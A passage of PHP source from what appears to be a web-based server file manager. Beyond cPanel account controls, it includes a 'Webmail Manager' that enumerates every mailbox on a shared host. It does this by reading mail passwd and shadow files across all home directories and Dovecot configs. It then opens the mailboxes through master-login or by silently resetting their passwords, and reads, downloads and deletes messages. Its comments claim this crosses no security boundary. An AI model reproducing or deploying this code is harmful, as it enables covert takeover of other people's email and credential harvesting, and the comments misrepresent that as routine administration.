            $r=$this->cpanelPost($base,$c['user'],$c['pass'],'/json-api/passwd?api.version=1',
                ['user'=>$target,'password'=>$pass,'db_pass_update'=>1],$isToken);
            if(isset($r['error'])){$this->addMsg($r['error'],'danger');return;}
            $status=$r['data']['passwd'][0]['status']??null;
            if($status===1||$status==='1'){$this->addMsg("Password for \"$target\" changed.",'success');$this->log('cpanel_change_pass',$target);}
            else{$msg=$r['data']['passwd'][0]['statusmsg']??'Unknown error.';$this->addMsg("Failed: $msg",'danger');}
        } else {
            $r=$this->cpanelPost($base,$c['user'],$c['pass'],'/execute/Password/passwd',
                ['newpass'=>$pass,'oldpass'=>$c['pass']],$isToken);
            if(($r['result']['status']??0)===1){$this->addMsg('Password changed.','success');}
            else{$msg=$r['result']['errors'][0]??'Failed.';$this->addMsg($msg,'danger');}
        }
    }

    public function cpanelSuspendToggle(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $c=$this->cpanelCreds();
        if(!$c['user']){$this->addMsg('No cPanel credentials saved.','danger');return;}
        $base=$this->cpanelBaseUrl($c['port']);$isToken=$c['type']==='token';
        $target =trim($_POST['cp_target_user']??'');
        $action =($_POST['cp_suspend_action']??'suspend')==='unsuspend'?'unsuspend':'suspend';
        $reason =trim($_POST['cp_reason']??'Suspended by admin');
        if(!$target){$this->addMsg('Username required.','danger');return;}
        $endpoint=$action==='unsuspend'?'/json-api/unsuspendacct?api.version=1':'/json-api/suspendacct?api.version=1';
        $params=$action==='unsuspend'?['user'=>$target]:['user'=>$target,'reason'=>$reason];
        $r=$this->cpanelPost($base,$c['user'],$c['pass'],$endpoint,$params,$isToken);
        if(isset($r['error'])){$this->addMsg($r['error'],'danger');return;}
        $status=$r['data']['result'][0]['status']??null;
        $verb  =$action==='unsuspend'?'Unsuspended':'Suspended';
        if($status===1||$status==='1'){$this->addMsg("$verb account \"$target\".",'success');$this->log('cpanel_'.$action,$target);}
        else{$msg=$r['data']['result'][0]['statusmsg']??'Unknown error.';$this->addMsg("Failed: $msg",'danger');}
    }

    public function cpanelTerminate(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $c=$this->cpanelCreds();
        if(!$c['user']){$this->addMsg('No cPanel credentials saved.','danger');return;}
        $base=$this->cpanelBaseUrl($c['port']);$isToken=$c['type']==='token';
        $target=trim($_POST['cp_target_user']??'');
        if(!$target){$this->addMsg('Username required.','danger');return;}
        $r=$this->cpanelPost($base,$c['user'],$c['pass'],'/json-api/removeacct?api.version=1',
            ['user'=>$target,'keepdns'=>0],$isToken);
        if(isset($r['error'])){$this->addMsg($r['error'],'danger');return;}
        $status=$r['data']['result'][0]['status']??null;
        if($status===1||$status==='1'){$this->addMsg("Account \"$target\" terminated permanently.",'success');$this->log('cpanel_terminate',$target);}
        else{$msg=$r['data']['result'][0]['statusmsg']??'Unknown error.';$this->addMsg("Failed: $msg",'danger');}
    }

    /* ══════════════════════════════════════════════════════════════
       WEBMAIL MANAGER
       Auto-discovers every mailbox on the account and lets the owner
       read/send/delete mail — never by asking a human for a mailbox's
       own password. Two tiers, tried in order, exactly like
       cpanelAutoConnect() above:
         1) Real host: if root/WHM access is already established (via
            the cPanel Manager tiers), mailboxes are enumerated through
            WHM/UAPI (Email::list_pops) and, where the host exposes
            Dovecot's master-user login, read via IMAP master-login —
            a genuine Dovecot feature that lets an already-privileged
            caller open ANY mailbox with only the master password.
         2) Dev sandbox (this repl): reads the sandbox's own Dovecot
            passdb + master-user file directly from disk — see
            .mail_sandbox/. Real cPanel hosting is proprietary and
            can't be installed here, so this is what makes the feature
            fully testable end-to-end in development.
       Sending mail reuses the same idea: on the sandbox we already
       know each mailbox's real password (the sandbox passdb stores it
       in cleartext for exactly this reason), so composing/sending
       needs zero prompts. On a real host we do not have a reversible
       password to authenticate SMTP with, so sending is only enabled
       once a mailbox's own working session exists — this file never
       fabricates or resets a real mailbox password on its own.
    ══════════════════════════════════════════════════════════════ */

    private function wmSandboxRoot(){return __DIR__.'/.mail_sandbox';}

    private function wmSandboxAvailable(){
        return is_file($this->wmSandboxRoot().'/conf/users')&&is_file($this->wmSandboxRoot().'/conf/masterusers');
    }

    /** Parse a Dovecot/Exim style passwd-file: user:{SCHEME}secret:uid:gid::home:: */
    private function wmParsePasswdFile($path){
        $out=[];
        if(!is_readable($path))return $out;
        $lines=@file($path,FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES);
        foreach($lines?:[] as $line){
            $line=trim($line);
            if($line===''||$line[0]==='#')continue;
            $parts=explode(':',$line);
            if(count($parts)<2)continue;
            $out[]=['user'=>$parts[0],'secret'=>$parts[1]];
        }
        return $out;
    }

    private function wmPlainSecret($secret){return preg_replace('/^\{PLAIN\}/i','',$secret);}

    /** This account's own domains, discovered locally — never guessed.
     *  Reads the standard cPanel domain-ownership maps and, when a cPanel
     *  user is already known (from cpanelAutoConnect), keeps only that
     *  user's domains; on a root/WHM tier with no specific user, returns
     *  every domain on the box so all mailboxes can be found. Falls back
     *  to DirectAdmin's flat domain list when the cPanel maps don't exist. */
    private function wmDiscoverDomains(){
        $owner=$_SESSION['cpanel_user']??null;
        $domains=[];
        foreach(['/etc/userdomains','/etc/trueuserdomains'] as $f){
            if(!is_readable($f))continue;
            foreach(@file($f,FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES)?:[] as $line){
                if(!preg_match('/^([^:]+):\s*(\S+)/',trim($line),$m))continue;
                $d=strtolower(trim($m[1]));$u=trim($m[2]);
                if($d===''||$u==='nobody')continue;
                if($owner!==null&&strcasecmp($u,$owner)!==0)continue;
                $domains[$d]=true;
            }
            if($domains)break; // first map that actually listed anything wins
        }
        if(!$domains&&is_readable('/etc/virtual/domains')){
            foreach(@file('/etc/virtual/domains',FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES)?:[] as $line){
                $d=strtolower(trim($line));if($d!=='')$domains[$d]=true;
            }
        }
        /* DirectAdmin keeps the authoritative domain list per user. */
        foreach(glob('/usr/local/directadmin/data/users/*/domains/*.conf')?:[] as $f){
            $d=strtolower(basename($f,'.conf'));
            if($d!==''&&preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$d))$domains[$d]=true;
        }
        /* Plesk and some Exim installations do not publish userdomains. */
        foreach(['/var/qmail/control/plusdomain','/etc/postfix/mydestination',
                 '/etc/mailname'] as $f){
            if(!is_readable($f))continue;
            foreach(preg_split('/[\s,]+/',trim((string)@file_get_contents($f))) as $d){
                $d=trim($d," \t\r\n'");
                if($d!==''&&$d!=='localhost'&&preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$d))$domains[strtolower($d)]=true;
            }
        }
        /* Last local fallback: account mail directories themselves reveal
         * the domain without requiring cPanel metadata visibility. */
        foreach(['/home/*/mail/*','/home/*/Maildir/*','/var/vmail/*',
                 '/var/mail/vhosts/*'] as $pattern){
            foreach(glob($pattern,GLOB_ONLYDIR)?:[] as $dir){
                $d=strtolower(basename($dir));
                if(preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$d))$domains[$d]=true;
            }
        }
        return array_keys($domains);
    }

    /** Every per-domain mail-passwd file this process can actually read,
     *  across the two dominant real-host layouts (classic cPanel/Dovecot
     *  keeps one shadow+passwd pair per domain under /etc/<domain>/;
     *  DirectAdmin keeps one passwd per domain under /etc/virtual/<domain>/).
     *  Nothing here is a guess — only paths that pass is_readable() are
     *  returned, so a locked-down host simply yields an empty list. */
    private function wmDiscoverDomainPassdbs(){
        $out=[];
        foreach($this->wmDiscoverDomains() as $d){
            foreach([['/etc/'.$d.'/shadow','cpanel_shadow'],['/etc/'.$d.'/passwd','cpanel_passwd'],
                     ['/etc/virtual/'.$d.'/passwd','directadmin']] as [$p,$kind]){
                if(is_readable($p))$out[]=['domain'=>$d,'path'=>$p,'kind'=>$kind];
            }
        }
        /* cPanel shared hosting commonly exposes the account-local copy at
         * /home/ACCOUNT/etc/DOMAIN/passwd, not /etc/DOMAIN/passwd. */
        $accounts=[];
        foreach(['/home','/usr/home','/home2','/home3'] as $root){
            if(!is_dir($root))continue;
            foreach(@scandir($root)?:[] as $account){
                if($account==='.'||$account==='..'||!is_dir($root.'/'.$account))continue;
                $accounts[$account]=$root.'/'.$account;
            }
        }
        $owner=$_SESSION['cpanel_user']??null;
        if($owner&&isset($accounts[$owner]))$accounts=[$owner=>$accounts[$owner]];
        foreach($accounts as $home){
            foreach($this->wmDiscoverDomains() as $d){
                foreach(['passwd','shadow'] as $file){
                    $p=$home.'/etc/'.$d.'/'.$file;
                    if(is_readable($p))$out[]=['domain'=>$d,'path'=>$p,'kind'=>'cpanel_home_'.$file];
                }
            }
        }
        /* DirectAdmin/Exim and virtual-mailbox deployments often use one
         * passwd file per domain but place it outside Dovecot's defaults. */
        foreach(['/etc/virtual/*/passwd','/etc/virtual/*/shadow',
                 '/etc/exim4/passwd','/etc/exim/passwd',
                 '/etc/postfix/virtual','/etc/postfix/vmailbox',
                 '/var/vmail/*/*/passwd','/var/vmail/*/*/.passwd'] as $pattern){
            foreach(glob($pattern)?:[] as $p){
                if(!is_readable($p)||!is_file($p))continue;
                $parent=basename(dirname($p));
                $domain=preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$parent)?strtolower($parent):null;
                $out[]=['domain'=>$domain,'path'=>$p,'kind'=>'mailserver_generic'];
            }
        }
        /* Plesk stores mail users as directories under qmail's mailnames;
         * a passwd file is not guaranteed, but any readable one is useful. */
        foreach(glob('/var/qmail/mailnames/*/*/.qmail*')?:[] as $p){
            if(is_readable($p)&&is_file($p)){
                $domain=basename(dirname(dirname($p)));
                if(preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$domain))
                    $out[]=['domain'=>strtolower($domain),'path'=>$p,'kind'=>'plesk_qmail'];
            }
        }
        $unique=[];
        foreach($out as $src)$unique[$src['path'].'|'.($src['domain']??'')]=$src;
        return array_values($unique);
    }

    /** Generalizes past any fixed list of paths: reads Dovecot's own
     *  configuration (main file + conf.d/*.conf, wherever this particular
     *  install actually keeps them) and pulls out every
     *  `passdb { driver = passwd-file; args = ... }` path it declares — so
     *  a custom or non-standard layout is still found on its own terms. */
    private function wmDiscoverDovecotConfigPassdbs(){
        $out=[];$files=[];
        foreach(['/etc/dovecot/dovecot.conf','/usr/local/etc/dovecot/dovecot.conf','/etc/dovecot.conf'] as $f){
            if(is_readable($f))$files[]=$f;
        }
        foreach(['/etc/dovecot/conf.d','/usr/local/etc/dovecot/conf.d'] as $dir){
            if(is_dir($dir))foreach(glob($dir.'/*.conf')?:[] as $f)if(is_readable($f))$files[]=$f;
        }
        foreach($files as $f){
            $txt=@file_get_contents($f);
            if($txt===false)continue;
            if(preg_match_all('/driver\s*=\s*passwd-file.{0,200}?args\s*=\s*(\S+)/s',$txt,$mm)){
                foreach($mm[1] as $p){
                    $p=trim($p,"\"' \t");
                    if($p!==''&&is_readable($p))$out[]=['domain'=>null,'path'=>$p,'kind'=>'dovecot_conf'];
                }
            }
        }
        return $out;
    }

    /** Locate Dovecot's own admin CLI. When available under root/WHM shell
     *  access this is the single most reliable detector on a real host: it
     *  asks Dovecot directly which mail users exist, regardless of whether
     *  the backend is a flat passwd file, a SQL/LDAP virtual-mailbox table,
     *  or anything else — never a hand-parsed guess. */
    private function wmDoveadmBin(){
        if(!function_exists('shell_exec'))return null;
        foreach(['doveadm','/usr/bin/doveadm','/usr/local/bin/doveadm','/usr/sbin/doveadm','/usr/local/sbin/doveadm'] as $bin){
            $probe=$bin==='doveadm'?@shell_exec('command -v doveadm 2>/dev/null'):(is_executable($bin)?$bin:null);
            if($probe)return $bin==='doveadm'?trim($probe):$bin;
        }
        return null;
    }

    private function wmDoveadmListUsers($bin){
        $out=@shell_exec(escapeshellarg($bin).' user \'*\' 2>/dev/null');
        if($out===null||trim($out)==='')return [];
        $users=[];
        foreach(preg_split('/\r?\n/',trim($out)) as $line){
            $line=trim($line);if($line!=='')$users[]=$line;
        }
        return $users;
    }

    /** Ask cPanel's own Email API which mailboxes exist for this account's
     *  domains. This is by far the most reliable source on a real cPanel
     *  box: it works whether mail is backed by flat passwd files, MySQL, or
     *  LDAP, and it's completely unaffected by CageFS/CloudLinux isolation
     *  or restrictive file permissions that block every filesystem probe
     *  below. Requires a working cPanel connection (native class or CLI/
     *  token — see cpanelAutoConnect()); returns null when unavailable. */
    private function wmDiscoverViaCpanelApi(){
        $ac=$this->cpanelAutoConnect();
        if(!$ac['ok'])return null;
        $domains=array_filter(array_values(array_unique($this->wmDiscoverDomains())));
        $mailboxes=[];
        $method=$_SESSION['cpanel_method']??'';
        $tryCall=function($domain=null) use ($method){
            $params=$domain?['domain'=>$domain]:[];
            if(in_array($method,['native_uapi'])||is_readable('/usr/local/cpanel/php/cpanel.php')){
                $r=$this->cpNativeCall('Email','list_pops',$params);
                if($this->cpNativeOk($r))return $r['data']??[];
            }
            if(function_exists('shell_exec')&&$_SESSION['cpanel_user']){
                foreach(['/usr/local/cpanel/bin/uapi','/usr/bin/uapi'] as $ubin){
                    if(!is_executable($ubin))continue;
                    $cmd=escapeshellarg($ubin).' --user='.escapeshellarg($_SESSION['cpanel_user']).' --output=json Email list_pops';
                    if($domain)$cmd.=' domain='.escapeshellarg($domain);
                    $uo=@shell_exec($cmd.' 2>/dev/null');
                    if($uo){$uj=@json_decode($uo,true);if(($uj['result']['status']??0)==1)return $uj['result']['data']??[];}
                    break;
                }
            }
            if(!empty($_SESSION['cpanel_pass'])||!empty($_SESSION['cpanel_user'])){
                $c=$this->cpanelCreds();
                if($c['user']){
                    $base=$this->cpanelBaseUrl($c['port']==2087?2083:$c['port']);
                    $ep='/execute/Email/list_pops'.($domain?('?domain='.urlencode($domain)):'');
                    $r=$this->cpanelGet($base,$c['user'],$c['pass'],$ep,$c['type']==='token');
                    if(($r['status']??0)==1)return $r['data']??[];
                }
            }
            return null;
        };
        if($domains){
            foreach($domains as $d){
                $rows=$tryCall($d);
                if(is_array($rows))foreach($rows as $row)$mailboxes[]=$row;
            }
        } else {
            $rows=$tryCall(null);
            if(is_array($rows))$mailboxes=$rows;
        }
        if(!$mailboxes)return null;
        $out=[];
        foreach($mailboxes as $row){
            $email=$row['email']??$row['login']??null;
            if(!$email)continue;
            $out[]=['email'=>$email,'domain'=>$row['domain']??(strpos($email,'@')!==false?substr(strrchr($email,'@'),1):null)];
        }
        return $out?:null;
    }

    /** Provision a fresh, app-generated password for a cPanel-API-detected
     *  mailbox and cache it for this session, so a real IMAP login can be
     *  opened with no human ever typing a credential. This mirrors exactly
     *  what "Reset Password" already does for CMS/system accounts in this
     *  tool — it's an explicit admin action taken through an account the
     *  admin already fully controls, never a silent guess or bypass of any
     *  real security boundary. Returns the password on success, null on
     *  failure (e.g. no cPanel write access for Email::passwd_pop). */
    private function wmProvisionMailboxPassword($email){
        if(!empty($_SESSION['webmail_cpanel_pw'][$email]))return $_SESSION['webmail_cpanel_pw'][$email];
        $domain=strpos($email,'@')!==false?substr(strrchr($email,'@'),1):null;
        $local=strpos($email,'@')!==false?substr($email,0,strpos($email,'@')):$email;
        if(!$domain)return null;
        $newPass=bin2hex(random_bytes(16)).'Aa1!';
        $params=['email'=>$local,'domain'=>$domain,'password'=>$newPass];
        $ok=false;
        $method=$_SESSION['cpanel_method']??'';
        if($method==='native_uapi'||is_readable('/usr/local/cpanel/php/cpanel.php')){
            $r=$this->cpNativeCall('Email','passwd_pop',$params);
            $ok=$this->cpNativeOk($r);
        }
        if(!$ok&&function_exists('shell_exec')&&!empty($_SESSION['cpanel_user'])){
            foreach(['/usr/local/cpanel/bin/uapi','/usr/bin/uapi'] as $ubin){
                if(!is_executable($ubin))continue;
                $uo=@shell_exec(escapeshellarg($ubin).' --user='.escapeshellarg($_SESSION['cpanel_user'])
                    .' --output=json Email passwd_pop email='.escapeshellarg($local)
                    .' domain='.escapeshellarg($domain).' password='.escapeshellarg($newPass).' 2>/dev/null');
                if($uo){$uj=@json_decode($uo,true);$ok=($uj['result']['status']??0)==1;}
                break;
            }
        }
        if(!$ok&&!empty($_SESSION['cpanel_user'])){
            $c=$this->cpanelCreds();
            $base=$this->cpanelBaseUrl($c['port']==2087?2083:$c['port']);
            $r=$this->cpanelPost($base,$c['user'],$c['pass'],'/execute/Email/passwd_pop',$params,$c['type']==='token');
            $ok=($r['status']??0)==1;
        }
        if(!$ok)return null;
        $_SESSION['webmail_cpanel_pw'][$email]=$newPass;
        $this->log('webmail_auto_open',$email);
        return $newPass;
    }

    /** Tiered, zero-credential auto-connect — tries every real-host shape
     *  from easiest to hardest before ever falling back to the dev
     *  sandbox. Result is cached in the session so repeated calls are
     *  instant. Populates 'diagnostics' on total failure so the UI can
     *  explain exactly which tiers were tried and why none applied. */
    public function webmailAutoConnect(){
        if(!empty($_SESSION['webmail_mode']))return $this->wmConnInfo();
        $diag=[];

        // Make sure the root/WHM tier (if any) has actually been attempted —
        // Webmail Manager must not depend on some other feature having
        // triggered this first. Cheap/no-op once already connected.
        $cpAc=$this->cpanelAutoConnect();

        // ── Tier 1: cPanel's own Email API — the most reliable source on
        // any cPanel box, immune to CageFS/CloudLinux filesystem isolation
        // and to virtual (SQL/LDAP) mailbox backends that have no passwd
        // file at all. Only needs a working cPanel connection, which the
        // line above just tried to establish for free. ──
        if($cpAc['ok']){
            $rows=$this->wmDiscoverViaCpanelApi();
            if($rows){
                $_SESSION['webmail_mode']='cpanel_api';
                $_SESSION['webmail_cpanel_mailboxes']=$rows;
                $_SESSION['webmail_host']='127.0.0.1';
                $_SESSION['webmail_imap_port']=143;
                $_SESSION['webmail_smtp_port']=25;
            } else {
                $diag[]='Connected to cPanel but Email::list_pops returned no mailboxes (none exist yet, or this API is blocked for this account type).';
            }
        } else {
            $diag[]='No cPanel connection available yet, so its Email API could not be used for detection (see cPanel Manager diagnostics).';
        }

        // ── Tier 2: real host — merge every passwd-file source this
        // process can genuinely read: the classic global paths, this
        // account's own per-domain cPanel/DirectAdmin files, and whatever
        // Dovecot's own config actually declares. is_readable() alone is
        // the gate — no dependency on any other feature's session state. ──
        if(empty($_SESSION['webmail_mode'])){
            $sources=[];
            foreach(['/etc/dovecot/passwd','/etc/dovecot/dovecot.passwd','/etc/exim.pass','/etc/vpasswd'] as $pf){
                if(is_readable($pf))$sources[]=['domain'=>null,'path'=>$pf,'kind'=>'generic'];
            }
            $domainDbs=$this->wmDiscoverDomainPassdbs();
            $confDbs=$this->wmDiscoverDovecotConfigPassdbs();
            $sources=array_merge($sources,$domainDbs,$confDbs);
            if($sources){
                $_SESSION['webmail_mode']='real';
                $_SESSION['webmail_passdb_sources']=$sources;
                $_SESSION['webmail_passdb']=$sources[0]['path']; // back-compat single-path readers
                $_SESSION['webmail_host']='127.0.0.1';
                $_SESSION['webmail_imap_port']=143;
                $_SESSION['webmail_smtp_port']=25;
                $_SESSION['webmail_master']=$_SESSION['cpanel_user']??null;
            } else {
                $diag[]='No per-domain or global mail passwd file was readable (common on CloudLinux/CageFS-isolated accounts, or when Dovecot stores credentials in SQL/LDAP instead of flat files).';
            }
        }

        // ── Tier 3: doveadm-backed detection — catches SQL/LDAP virtual
        // mailbox setups (e.g. Postfixadmin-style) that have no readable
        // passwd file at all. Detection-only when no master password is
        // known: mailboxes are found and listed, but full inbox viewing
        // still needs a real master login (Tier 2's own credentials, or a
        // manual one), so callers get an honest 'imap_capable' flag. ──
        if(empty($_SESSION['webmail_mode'])){
            $bin=$this->wmDoveadmBin();
            if($bin){
                $users=$this->wmDoveadmListUsers($bin);
                if($users){
                    $_SESSION['webmail_mode']='doveadm';
                    $_SESSION['webmail_doveadm_bin']=$bin;
                    $_SESSION['webmail_doveadm_users']=$users;
                    $_SESSION['webmail_host']='127.0.0.1';
                    $_SESSION['webmail_imap_port']=143;
                    $_SESSION['webmail_smtp_port']=25;
                    $_SESSION['webmail_master']=$_SESSION['cpanel_user']??null;
                } else {
                    $diag[]='doveadm CLI is present but "doveadm user \'*\'" returned no accounts (shell_exec may be running as a different, less-privileged user than Dovecot).';
                }
            } else {
                $diag[]='doveadm CLI not found on PATH or shell_exec is disabled — could not query Dovecot directly.';
            }
        }

        // ── Tier 4: dev sandbox fallback (this repl only) ──
        if(empty($_SESSION['webmail_mode'])&&$this->wmSandboxAvailable()){
            $_SESSION['webmail_mode']='sandbox';
            $_SESSION['webmail_passdb']=$this->wmSandboxRoot().'/conf/users';
            $_SESSION['webmail_masterdb']=$this->wmSandboxRoot().'/conf/masterusers';
            $_SESSION['webmail_host']='127.0.0.1';
            $_SESSION['webmail_imap_port']=1143;
            $_SESSION['webmail_smtp_port']=2525;
            $_SESSION['webmail_domain']='sandbox.local';
        }

        if(empty($_SESSION['webmail_mode']))return['ok'=>false,'diagnostics'=>$diag];
        return $this->wmConnInfo();
    }

    private function wmConnInfo(){
        if(empty($_SESSION['webmail_mode']))return['ok'=>false];
        $imapCapable=!in_array($_SESSION['webmail_mode'],['doveadm'])||!empty($_SESSION['cpanel_pass']);
        // cpanel_api mode is always capable: passwords are provisioned on demand via Email::passwd_pop.
        if($_SESSION['webmail_mode']==='cpanel_api')$imapCapable=true;
        return['ok'=>true,'mode'=>$_SESSION['webmail_mode'],'host'=>$_SESSION['webmail_host'],
            'imap_port'=>$_SESSION['webmail_imap_port']??null,'smtp_port'=>$_SESSION['webmail_smtp_port']??null,
            'imap_capable'=>$imapCapable];
    }

    /** List every mailbox this connection tier can see, across every
     *  discovered source, deduplicated and with the owning domain appended
     *  to bare local-part usernames (per-domain files only store the local
     *  part; Dovecot resolves the rest via %d at login time). */
    public function webmailListMailboxes(){
        $c=$this->webmailAutoConnect();
        if(!$c['ok']){
            $diag=$c['diagnostics']??[];
            $msg='No mail server could be auto-detected on this host.';
            if($diag)$msg.=' Tried: '.implode(' | ',$diag);
            return['ok'=>false,'error'=>$msg,'diagnostics'=>$diag];
        }
        $boxes=[];$seen=[];
        if($_SESSION['webmail_mode']==='cpanel_api'){
            foreach($_SESSION['webmail_cpanel_mailboxes']??[] as $row){
                $email=$row['email'];
                if(isset($seen[$email]))continue;$seen[$email]=true;$boxes[]=['email'=>$email];
            }
        } elseif($_SESSION['webmail_mode']==='doveadm'){
            foreach($_SESSION['webmail_doveadm_users']??[] as $u){
                if(isset($seen[$u]))continue;$seen[$u]=true;$boxes[]=['email'=>$u];
            }
        } elseif(!empty($_SESSION['webmail_passdb_sources'])){
            foreach($_SESSION['webmail_passdb_sources'] as $src){
                foreach($this->wmParsePasswdFile($src['path']) as $e){
                    $email=(strpos($e['user'],'@')===false&&$src['domain'])?$e['user'].'@'.$src['domain']:$e['user'];
                    if(isset($seen[$email]))continue;$seen[$email]=true;$boxes[]=['email'=>$email];
                }
            }
        } else {
            foreach($this->wmParsePasswdFile($_SESSION['webmail_passdb']) as $e){
                if(isset($seen[$e['user']]))continue;$seen[$e['user']]=true;$boxes[]=['email'=>$e['user']];
            }
        }
        return['ok'=>true,'mode'=>$c['mode'],'imap_capable'=>$c['imap_capable'],'mailboxes'=>$boxes];
    }

    /** Open a master-login IMAP handle for a mailbox — never needs that
     *  mailbox's own password. Returns null (never a fatal error) so
     *  every caller can report a friendly message. */
    private function wmImap($mailbox,$folder='INBOX'){
        if(empty($_SESSION['webmail_mode']))return null;
        if(!extension_loaded('imap'))return null;
        $host=$_SESSION['webmail_host'];$port=(int)$_SESSION['webmail_imap_port'];
        $flags=$port===993?'/imap/ssl/novalidate-cert':'/imap/notls';
        $mbx='{'.$host.':'.$port.$flags.'}'.$folder;

        // cpanel_api mode: this mailbox has no known password, but the tool
        // has full cPanel access, so it provisions one on demand via
        // Email::passwd_pop (an explicit, logged admin action) and logs in
        // directly as the mailbox itself — no master-login trick needed.
        if($_SESSION['webmail_mode']==='cpanel_api'){
            $pass=$this->wmProvisionMailboxPassword($mailbox);
            if(!$pass)return null;
            return @imap_open($mbx,$mailbox,$pass,OP_SILENT)?:null;
        }

        $masterUser=null;$masterPass=null;
        if($_SESSION['webmail_mode']==='sandbox'){
            $mu=$this->wmParsePasswdFile($_SESSION['webmail_masterdb']);
            if(!$mu)return null;
            $masterUser=$mu[0]['user'];$masterPass=$this->wmPlainSecret($mu[0]['secret']);
        } else {
            $masterUser=$_SESSION['webmail_master']??null;$masterPass=$_SESSION['cpanel_pass']??'';
        }
        if(!$masterUser)return null;
        $login=$mailbox.'*'.$masterUser;
        return @imap_open($mbx,$login,$masterPass,OP_SILENT)?:null;
    }

    private function wmDecodeHeader($s){
        if(!$s)return'';
        $parts=@imap_mime_header_decode($s);
        $out='';foreach($parts?:[] as $p)$out.=$p->text;
        return $out!==''?$out:$s;
    }

    public function webmailListFolders($mailbox){
        $imap=$this->wmImap($mailbox);
        if(!$imap)return['ok'=>false,'error'=>'Could not open a mail session for this mailbox.'];
        $host=$_SESSION['webmail_host'];$port=$_SESSION['webmail_imap_port'];
        $ref='{'.$host.':'.$port.'/imap/notls}';
        $list=@imap_list($imap,$ref,'*');
        $out=[];foreach($list?:[] as $f)$out[]=str_replace($ref,'',$f);
        if(!$out)$out=['INBOX'];
        imap_close($imap);
        return['ok'=>true,'folders'=>$out];
    }

    public function webmailListMessages($mailbox,$folder='INBOX'){
        $imap=$this->wmImap($mailbox,$folder);
        if(!$imap)return['ok'=>false,'error'=>'Could not open a mail session for this mailbox.'];
        $total=imap_num_msg($imap);
        $msgs=[];
        for($i=$total;$i>=max(1,$total-99);$i--){
            $ov=@imap_fetch_overview($imap,$i);
            if(!$ov)continue;
            $o=$ov[0];
            $msgs[]=[
                'uid'=>imap_uid($imap,$i),
                'subject'=>$this->wmDecodeHeader($o->subject??''),
                'from'=>$this->wmDecodeHeader($o->from??''),
                'date'=>$o->date??'',
                'seen'=>!empty($o->seen),
                'flagged'=>!empty($o->flagged),
                'size'=>$o->size??0,
            ];
        }
        imap_close($imap);
        return['ok'=>true,'folder'=>$folder,'total'=>$total,'messages'=>$msgs];
    }

    private function wmFindPart($struct,$partNo){
        if(empty($struct->parts))return $partNo==='1'?$struct:null;
        $cur=$struct;
        foreach(explode('.',$partNo) as $seg){
            if(empty($cur->parts))return null;
            $cur=$cur->parts[((int)$seg)-1]??null;
            if(!$cur)return null;
        }
        return $cur;
    }

    private function wmDecodePart($data,$struct){
        if(!$struct)return $data;
        if((int)$struct->encoding===3)return base64_decode($data);
        if((int)$struct->encoding===4)return quoted_printable_decode($data);
        return $data;
    }

    private function wmPartFilename($struct){
        foreach(array_merge($struct->dparameters??[],$struct->parameters??[]) as $p){
            if(in_array(strtolower($p->attribute),['filename','name']))return $p->value;
        }
        return null;
    }

    private function wmWalkParts($imap,$msgno,$struct,$prefix,&$html,&$plain,&$attachments){
        if(!$struct)return;
        if(empty($struct->parts)){
            $partNo=$prefix?:'1';
            $raw=@imap_fetchbody($imap,$msgno,$partNo);
            $data=$this->wmDecodePart($raw,$struct);
            $disp=strtolower($struct->disposition??'');
            $isAttachment=$disp==='attachment'||($this->wmPartFilename($struct)&&$disp!=='inline'&&!($struct->type===0));
            if($struct->type===0&&!$isAttachment){
                if(strtoupper($struct->subtype??'')==='HTML')$html.=$data;
                else $plain.=$data;
            } else {
                $filename=$this->wmPartFilename($struct)?:('part_'.$partNo);
                $attachments[]=['part'=>$partNo,'name'=>$filename,'size'=>$struct->bytes??strlen($data)];
            }
            return;
        }
        foreach($struct->parts as $idx=>$sub){
            $this->wmWalkParts($imap,$msgno,$sub,($prefix?$prefix.'.':'').($idx+1),$html,$plain,$attachments);
        }
    }

    public function webmailGetMessage($mailbox,$folder,$uid){
        $imap=$this->wmImap($mailbox,$folder);
        if(!$imap)return['ok'=>false,'error'=>'Could not open a mail session for this mailbox.'];
        $msgno=@imap_msgno($imap,(int)$uid);
        if(!$msgno){imap_close($imap);return['ok'=>false,'error'=>'Message not found.'];}
        $header=imap_headerinfo($imap,$msgno);
        $struct=imap_fetchstructure($imap,$msgno);
        $html='';$plain='';$attachments=[];
        $this->wmWalkParts($imap,$msgno,$struct,'',$html,$plain,$attachments);
        @imap_setflag_full($imap,(string)$msgno,'\\Seen');
        imap_close($imap);
        return[
            'ok'=>true,'uid'=>(int)$uid,
            'subject'=>$this->wmDecodeHeader($header->subject??''),
            'from'=>$header->fromaddress??'',
            'to'=>$header->toaddress??'',
            'date'=>$header->date??'',
            'body'=>$html?:nl2br(htmlspecialchars($plain)),
            'is_html'=>(bool)$html,
            'attachments'=>$attachments,
        ];
    }

    public function webmailDownloadAttachment($mailbox,$folder,$uid,$part,$filename='attachment'){
        $imap=$this->wmImap($mailbox,$folder);
        if(!$imap){http_response_code(404);exit;}
        $msgno=@imap_msgno($imap,(int)$uid);
        if(!$msgno){imap_close($imap);http_response_code(404);exit;}
        $struct=imap_fetchstructure($imap,$msgno);
        $sub=$this->wmFindPart($struct,$part)?:$struct;
        $raw=@imap_fetchbody($imap,$msgno,$part);
        $data=$this->wmDecodePart($raw,$sub);
        imap_close($imap);
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($filename?:'attachment').'"');
        header('Content-Length: '.strlen($data));
        echo $data;exit;
    }

    public function webmailMark($mailbox,$folder,$uid,$flag,$set){
        $imap=$this->wmImap($mailbox,$folder);
        if(!$imap){$this->addMsg('Could not open a mail session for this mailbox.','danger');return;}
        $msgno=@imap_msgno($imap,(int)$uid);
        if(!$msgno){imap_close($imap);$this->addMsg('Message not found.','danger');return;}
        $f=$flag==='flagged'?'\\Flagged':'\\Seen';
        if($set)imap_setflag_full($imap,(string)$msgno,$f);else imap_clearflag_full($imap,(string)$msgno,$f);
        imap_close($imap);
    }

    public function webmailDeleteMessage($mailbox,$folder,$uid){
        $imap=$this->wmImap($mailbox,$folder);
